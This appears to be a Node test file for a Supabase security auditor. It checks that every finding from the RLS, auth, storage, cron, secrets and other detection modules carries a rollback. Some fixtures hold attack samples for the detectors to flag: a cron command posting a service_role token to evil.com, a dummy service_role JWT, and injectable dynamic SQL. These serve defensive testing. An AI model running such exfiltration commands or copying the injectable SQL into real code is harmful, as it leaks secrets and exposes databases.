// Entry 24: "Every finding ships an executable fix AND a rollback."
//
// Validates that every finding with executable SQL has non-empty rollback_sql,
// and every finding with management_api_action has non-null
// rollback_management_api_action. Dashboard-only / no-fix findings are exempt.
// Also verifies that planRemediations extracts rollback_management_api_action.

import { test } from "node:test";
import assert from "node:assert/strict";
import { normalizeFinding } from "../scripts/contract.js";
import { extractExecutableSql } from "../scripts/remediate.js";
import { planRemediations } from "../scripts/remediate.js";
import { classifyTable } from "../scripts/checks/rls.js";
import { probeRpcs } from "../scripts/checks/rpc.js";
import { classifyView } from "../scripts/checks/views.js";
import { analyzeFunctionBody } from "../scripts/checks/function-body.js";
import { classifyRealtimeTable, classifyRealtimeMessages } from "../scripts/checks/realtime.js";
import { classifyColumnGrant, findExposedSchemas } from "../scripts/checks/grants.js";
import { classifyBucket, findBucketConfigIssues } from "../scripts/checks/storage.js";
import { analyzeAuthConfig } from "../scripts/checks/auth.js";
import { classifyEdgeFunction } from "../scripts/checks/edge_functions.js";
import { classifyNetworkDbConfig } from "../scripts/checks/network_db.js";
import { classifyDataApiConfig } from "../scripts/checks/data_api.js";
import { classifyExtension, classifyCronJob, classifyVaultGrants } from "../scripts/checks/extensions_cron.js";
import { scanFile } from "../scripts/checks/secrets.js";

/**
 * Validate a raw finding against entry-24 rollback requirements:
 *  - executable SQL present  → rollback_sql must be non-empty
 *  - management_api_action present → rollback_management_api_action must be non-null
 * Dashboard-only / no-fix findings are exempt (no assertion failure).
 */
function assertValidRollback(raw) {
  const f = normalizeFinding(raw);
  const fix = f.fix;
  const hasExecutableSql = extractExecutableSql(fix).length > 0;
  const hasMgmtApi = !!fix.management_api_action;

  if (hasExecutableSql) {
    assert.ok(
      Array.isArray(fix.rollback_sql) && fix.rollback_sql.length > 0,
      `${f.check} (${f.category}): has executable SQL but rollback_sql is empty`
    );
  }
  if (hasMgmtApi) {
    assert.ok(
      fix.rollback_management_api_action !== null &&
        typeof fix.rollback_management_api_action === "object",
      `${f.check} (${f.category}): has management_api_action but rollback_management_api_action is null`
    );
  }
}

/** Collect all findings from every check module (sync portion). */
function collectSyncFindings() {
  const out = [];

  // --- rls.js: 5 check types ---
  out.push(
    classifyTable({ table_name: "t_rls_off", rls_enabled: false, anon_select: true, policies: [] })
  );
  out.push(
    classifyTable({
      table_name: "t_perm_read", rls_enabled: true, anon_select: true,
      policies: [{ policyname: "p", cmd: "SELECT", roles: "{anon}", qual: "true", with_check: null }],
    })
  );
  out.push(
    classifyTable({
      table_name: "t_perm_write", rls_enabled: true, anon_insert: true,
      policies: [{ policyname: "pw", cmd: "INSERT", roles: "{anon}", qual: null, with_check: null }],
    })
  );
  out.push(
    classifyTable({
      table_name: "t_diverge", rls_enabled: true, anon_insert: true,
      // qual="true" is permissive for reads but this is an UPDATE policy so
      // read-side check doesn't see it; with_check has tenant scope so write-side
      // permissive check doesn't fire — the diverence check does.
      policies: [{ policyname: "pd", cmd: "UPDATE", roles: "{anon}", qual: "true", with_check: "user_id = auth.uid()" }],
    })
  );
  out.push(
    classifyTable({ table_name: "t_no_pol", rls_enabled: true, anon_select: true, policies: [] })
  );

  // --- views.js: 2 check types ---
  out.push(
    ...classifyView(
      { view_name: "v1", security_invoker: false, anon_select: true, columns: [] }, null
    )
  );
  out.push(
    ...classifyView(
      { view_name: "v2", security_invoker: true, anon_select: true, columns: ["email"] }, null
    )
  );

  // --- function-body.js: 3 check types (single fn triggers all three) ---
  out.push(
    ...analyzeFunctionBody({
      function_name: "f1", prosecdef: true,
      body: "EXECUTE 'SELECT * FROM t WHERE id = ' || account_id",
      config: [],
      anon_execute: true, auth_execute: false,
    })
  );

  // --- realtime.js: 3 check types ---
  out.push(
    ...classifyRealtimeTable(
      { table_name: "rt1", rls_enabled: false, in_publication: true }, null
    )
  );
  out.push(
    ...classifyRealtimeMessages({
      rls_enabled: false, anon_select: true, anon_insert: false, has_policies: false,
    })
  );
  out.push(
    ...classifyRealtimeMessages({
      rls_enabled: false, anon_select: false, anon_insert: true, has_policies: false,
    })
  );

  // --- grants.js: 2 check types ---
  out.push(
    classifyColumnGrant({
      schema_name: "public", table_name: "t", column_name: "email", data_type: "text",
      anon_col_select: true, anon_table_select: false, auth_col_select: false, auth_table_select: false,
    })
  );
  out.push(...findExposedSchemas(["custom_schema"]));

  // --- storage.js: 5 check types ---
  out.push(
    ...classifyBucket(
      { id: "b1", name: "test", public: true },
      [
        { policyname: "r", cmd: "SELECT", roles: "{anon}", qual: null, with_check: null },
        { policyname: "i", cmd: "INSERT", roles: "{anon}", qual: null, with_check: null },
        { policyname: "u", cmd: "UPDATE", roles: "{anon}", qual: null, with_check: null },
      ],
      null
    )
  );
  out.push(
    ...findBucketConfigIssues([
      { id: "b2", name: "docs", public: true, file_size_limit: null, allowed_mime_types: null },
    ])
  );

  // --- auth.js: 9 check types ---
  out.push(
    ...analyzeAuthConfig(
      {
        disable_signup: false, mailer_autoconfirm: true,
        external_anonymous_users_enabled: true,
        password_min_length: 6, password_required_characters: "",
        security_captcha_enabled: false,
        password_hibp_enabled: false, mfa_enabled: false,
        jwt_exp: 36000, uri_allow_list: [],
      },
      "test-ref"
    )
  );

  // --- edge_functions.js: 4 check types ---
  out.push(
    ...classifyEdgeFunction(
      { id: "e1", name: "fn1", verify_jwt: false, cors: false, body: "" }, "ref"
    )
  );
  out.push(
    ...classifyEdgeFunction(
      { id: "e2", name: "fn2", verify_jwt: true, cors: true }, "ref"
    )
  );
  out.push(
    ...classifyEdgeFunction(
      { id: "e3", name: "fn3", verify_jwt: true, cors: false,
        body: "const K = Deno.env.get('KEY'); console.log(K);" }, "ref"
    )
  );
  out.push(
    ...classifyEdgeFunction(
      { id: "e4", name: "fn4", verify_jwt: false, cors: false,
        body: "supabase.from('t').insert({x:1})" }, "ref"
    )
  );

  // --- network_db.js: 3 check types ---
  out.push(
    ...classifyNetworkDbConfig(
      {
        name: "production-app",
        network_restrictions: { enabled: false },
        db_ssl: false,
        pool_mode: "session",
      },
      "test-ref"
    )
  );

  // --- data_api.js: 2 check types ---
  out.push(
    ...classifyDataApiConfig(
      {
        auto_expose: true, leaky_owner_roles: ["postgres"],
        exposed_schemas: ["public"], table_count: 5, function_count: 30,
      },
      "test-ref"
    )
  );

  // --- extensions_cron.js: 4 check types ---
  out.push(...classifyExtension({ extname: "http", extversion: "1.0" }));
  out.push(
    ...classifyCronJob({
      jobid: 1, schedule: "* * * * *",
      command: `SELECT net.http_post('https://evil.com', 'bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoic2VydmljZV9yb2xlIn0.dGhpcyBpcyBhIHNpZ25hdHVyZSBzdHJpbmc')`,
      database: "postgres", username: "supabase_admin",
    })
  );
  out.push(...classifyVaultGrants({ anon_select: true, auth_select: false }, "test-ref"));

  // --- secrets.js: 2 check types ---
  // A service_role JWT committed in source → committed_service_role_jwt finding.
  // The JWT payload is {"role":"service_role"}.
  const JWT = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoic2VydmljZV9yb2xlIn0.dGhpcyBpcyBhIHNpZ25hdHVyZSBzdHJpbmc";
  out.push(...scanFile("test.js", `const K = '${JWT}';`));
  out.push(...scanFile(".env", `NEXT_PUBLIC_LEAK=${JWT}`));

  return out.filter((f) => f !== null && f !== undefined);
}

/** Collect ALL findings (sync + async RPC). Must be awaited. */
async function collectAllFindings() {
  const sync = collectSyncFindings();
  const { findings: rpcFindings } = await probeRpcs(
    [
      {
        function_name: "test_rpc", prosecdef: false, provolatile: "v",
        return_type: "void", anon_execute: true, auth_execute: false, args: [],
      },
    ],
    null
  );
  return [...sync, ...rpcFindings];
}

test("entry 24: every finding with executable SQL has non-empty rollback_sql", async () => {
  const findings = await collectAllFindings();
  for (const f of findings) {
    assertValidRollback(f);
  }
});

test("entry 24: every finding with management_api_action has non-null rollback_management_api_action", async () => {
  const findings = await collectAllFindings();
  for (const raw of findings) {
    const f = normalizeFinding(raw);
    if (f.fix.management_api_action) {
      assert.ok(
        f.fix.rollback_management_api_action !== null,
        `${f.check}: management_api_action present but rollback_management_api_action is null`
      );
    }
  }
});

test("entry 24: all expected check types are exercised by the test harness", async () => {
  const findings = await collectAllFindings();
  const checksSeen = new Set(findings.map((f) => f.check));

  const expected = [
    // rls.js
    "rls_disabled", "rls_permissive_policy", "rls_permissive_write_policy",
    "rls_with_check_divergence", "rls_no_policies_with_anon_grants",
    // rpc.js
    "rpc_granted_inferred",
    // views.js
    "view_security_definer_bypass", "view_exposes_pii_to_anon",
    // function-body.js
    "function_secdef_missing_auth_check", "function_secdef_no_search_path",
    "function_secdef_dynamic_sql",
    // realtime.js
    "realtime_publication_no_rls", "realtime_broadcast_anon_read",
    "realtime_broadcast_anon_write",
    // grants.js
    "column_grant_exposes_column", "custom_schema_exposed",
    // storage.js
    "storage_objects_anon_read", "storage_objects_anon_insert",
    "storage_objects_anon_tamper", "storage_policy_unscoped_path",
    "storage_bucket_misconfigured",
    // auth.js
    "auth_signups_enabled_no_confirm", "anonymous_signins_enabled",
    "weak_password_policy", "no_captcha_on_auth", "auth_hibp_disabled",
    "auth_mfa_disabled", "auth_jwt_exp_too_long", "auth_redirect_allowlist_open",
    "auth_rate_limit_missing",
    // edge_functions.js
    "edge_function_verify_jwt_disabled", "edge_function_wildcard_cors",
    "edge_function_secret_echo", "edge_function_unauthenticated_write",
    // network_db.js
    "db_no_network_restrictions", "db_ssl_disabled", "db_pool_session_mode",
    // data_api.js
    "data_api_auto_expose_on", "data_api_many_functions_exposed",
    // extensions_cron.js
    "extension_risky_installed", "extension_known_vulnerable",
    "cron_job_embedded_secret", "vault_decrypted_secrets_exposed",
    // secrets.js
    "committed_service_role_jwt", "env_secret_exposed_to_browser",
  ];

  for (const name of expected) {
    assert.ok(checksSeen.has(name), `test harness missing check type: ${name}`);
  }
});

test("entry 24: planRemediations extracts rollback_management_api_action", async () => {
  const findings = await collectAllFindings();
  const result = { project_ref: "test-ref", findings: findings.map(normalizeFinding) };
  const plan = planRemediations(result);

  // Every plan item should carry rollback_sql (possibly empty array) and
  // rollback_management_api_action (possibly null).
  for (const item of plan) {
    assert.ok("rollback_sql" in item, `${item.check}: plan item missing rollback_sql`);
    assert.ok(
      "rollback_management_api_action" in item,
      `${item.check}: plan item missing rollback_management_api_action`
    );
  }

  // Spot-check: auth findings have management_api_action → plan item must have
  // non-null rollback_management_api_action.
  const authItem = plan.find((p) => p.check === "auth_mfa_disabled");
  assert.ok(authItem, "expected auth_mfa_disabled in plan");
  assert.ok(
    authItem.rollback_management_api_action !== null,
    "auth_mfa_disabled: rollback_management_api_action should be non-null"
  );
  assert.equal(authItem.rollback_management_api_action.method, "PATCH");
  assert.deepEqual(authItem.rollback_management_api_action.body, { mfa_enabled: false });
});
